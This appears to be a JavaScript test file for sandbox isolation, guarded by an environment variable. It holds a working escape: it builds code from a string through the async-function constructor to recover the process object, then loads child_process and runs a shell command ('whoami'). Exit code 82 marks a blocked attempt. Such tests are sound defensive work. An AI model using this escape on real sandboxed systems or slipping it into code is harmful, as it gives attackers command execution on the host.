if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message ===
			"Code generation from strings disallowed for this context" ||
		error.message === "process is not defined" ||
		error.message === "Cannot read properties of undefined (reading 'require')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

const out = async function () {}.constructor("return process")();
console.log(
	out.mainModule
		.require("child_" + "process")
		.execSync("whoami")
		.toString(),
);
